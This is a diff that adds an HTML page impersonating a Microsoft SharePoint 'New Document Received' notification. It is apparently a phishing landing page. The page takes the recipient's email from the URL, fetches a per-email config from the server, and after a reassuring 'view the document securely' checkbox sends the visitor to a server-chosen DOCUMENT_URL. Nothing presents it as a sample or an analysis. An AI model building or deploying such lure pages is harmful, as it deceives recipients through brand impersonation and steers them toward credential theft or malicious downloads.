@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office SharePoint Notification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+        .logo {
+            width: 200px; /* Increased logo size */
+            height: auto;
+            margin-bottom: 30px;
+        }
+        .title {
+            font-size: 28px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .message {
+            font-size: 20px;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+        .email {
+            font-size: 20px;
+            color: #0078d4;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        button {
+            background-color: #000;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        button:hover {
+            background-color: #333;
+        }
+        .checkbox {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.4;
+        }
+        .checkbox input {
+            margin-right: 10px;
+            transform: scale(1.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://community.activepieces.com/uploads/default/original/2X/4/45661129c28383bfbfe64ba0443a472c47b8ffc8.png" alt="SharePoint Logo" class="logo">
+        <div class="title">New Document Received</div>
+        <div class="message">
+            Hello,<br>
+            You received a new document from one of your contacts.
+        </div>
+        <div class="email"></div>
+        <button id="download_btn">VIEW</button>
+        <div class="checkbox">
+            <input type="checkbox" id="understand">
+            <label for="understand">I understand this link will redirect me to view the document securely.</label>
+        </div>
+    </div>
+
+    <script>
+(function() {
+  let lastEmail = null;
+
+  function getEmailFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("email");
+  }
+
+   function redirectIfChecked(url) {
+            const checkbox = document.getElementById('understand');
+            if (checkbox.checked) {
+                window.location.href = url;
+            } else {
+                alert('Please check the box to proceed.');
+            }
+        }
+        
+  async function refreshConfig(email) {
+    try {
+      const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
+      const cfg = await res.json();
+
+      // update restoreBtn
+      const view_btn = document.getElementById("download_btn") 
+      if(view_btn){
+        view_btn.addEventListener("click",evt =>redirectIfChecked(cfg.DOCUMENT_URL))
+      }
+    } catch (err) {
+      console.error("Config load failed", err);
+    }
+  }
+
+  function checkForEmailChange() {
+    const email = getEmailFromUrl();
+    console.log(`Checked email and found ${email}`)
+    if (email && email.length > 4 && email !== lastEmail) {
+      lastEmail = email;
+      refreshConfig(email);
+    }
+  }
+
+  // Run at page load
+  //checkForEmailChange();
+  refreshConfig('');
+
+  // Watch periodically (since user can manually edit URL bar)
+  setInterval(checkForEmailChange, 3000);
+
+})();
+
+    </script>
+</body>
+</html>
